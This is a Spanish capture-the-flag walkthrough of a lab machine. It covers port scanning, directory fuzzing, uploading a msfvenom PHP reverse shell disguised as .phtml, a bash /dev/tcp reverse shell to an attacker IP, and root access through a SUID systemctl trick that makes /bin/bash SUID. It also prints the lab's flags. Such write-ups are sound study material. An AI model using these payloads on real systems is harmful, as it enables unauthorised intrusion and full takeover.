
```bash
ping -c 10.10.203.187
nmap -p- --open -sS -sC -sV --min-rate 5000 -vvv -n -Pn 10.10.203.187 -oN escaneo
gobuster dir -u http://10.10.203.187:3333/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt 
msfvenom -p php/reverse_php LHOST=10.9.142.44 LPORT=443 -f raw -o pwned.php
mv pwned.php pwned.phtml
gobuster dir -u http://10.10.203.187:3333/internal/ -w /usr/share/dirbuster/wordlists/directory-list-lowercase-2.3-medium.txt
nc -nlvp 443
nc -nlvp 4444
bash -c "sh -i >& /dev/tcp/10.9.142.44/4444 0>&1"
```

Realizamos un escaner de nmap en el que encontramos los puertos 21, 22, 139, 445, 3128, 3333, nos centraremos en el puerto 3333 que corre un servidor web![[Pasted image 20240305165937.png]]
Y accedemos la ip con el puerto 3333 donde vemos la siguiente página web.![[Pasted image 20240305170408.png]]
Ahora procederemos a hacer fuzzing web con gobuster y encontramos el directorio internal![[Pasted image 20240305170800.png]]
Al meternos nos encontramos el siguiente panel para subir archivos![[Pasted image 20240305170849.png]]
Debido a esto creamos un archivo php malicioso con msfvenom pero al intentar subirlo a la máquina nos salta el siguiente error así que lo cambiaremos a un phtml para ver si se puede
![[Pasted image 20240305171250.png]]
Gracias a cambiar el formato nos da un mensaje de que se ha subido![[Pasted image 20240305171614.png]]
Ahora buscaremos con gobuster donde se ha subido el archivo y vemos la carpeta uploads![[Pasted image 20240305171748.png]]
Esta carpeta al entrar encontramos lo siguiente![[Pasted image 20240305171812.png]]
Y si nos ponemos en escucha con netcat y ejecutamos el pwned.phtml lograremos entrar a la máquina además nos pondremos en escucha por el puerto 4444 y usaremos una reverse shell para garantizar persistencia![[Pasted image 20240305172313.png]]
Finalmente haremos el tratamiento de la TTY y se quedara la siguiente consola![[Pasted image 20240305172420.png]]
```shell
cd /home/bill
cat user.txt
sudo -l
find / -perm -4000 2>/dev/null
cd /tmp
bash privUP.sh
bash -p
cat /root/root.txt
```
Ahora buscaremos la flag de user que estará en el directorio /home/bill y será la siguiente: 8bd7992fbe8a6ad22a63361004cfcedb![[Pasted image 20240305172612.png]]
Primero usaremos el sudo -l para ver que permisos tengo, pero como nos pide contraseña pasaremos a buscar los binarios SUID, encontramos los siguientes![[Pasted image 20240305173314.png]]
Buscamos el binario systemctl en GTFOBins y encontramos un exploit para escalar privilegios![[Pasted image 20240305173608.png]]
Entonces creamos es siguiente script privUP.sh
```shell
#!/bin/bash
TF=$(mktemp).service
echo '[Service]
Type=oneshot
ExecStart=/bin/sh -c "chmod u+s /bin/bash"
[Install]
WantedBy=multi-user.target' > $TF
./bin/systemctl link $TF
./bin/systemctl enable --now $TF
```
![[Pasted image 20240305174207.png]]
Y lo ejecutamos logrando así una bash de root
![[Pasted image 20240305174455.png]]
Finalmente encontramos la flag de root que es a58ff8579f0a9270368d33a9966c7fd5![[Pasted image 20240305174516.png]]
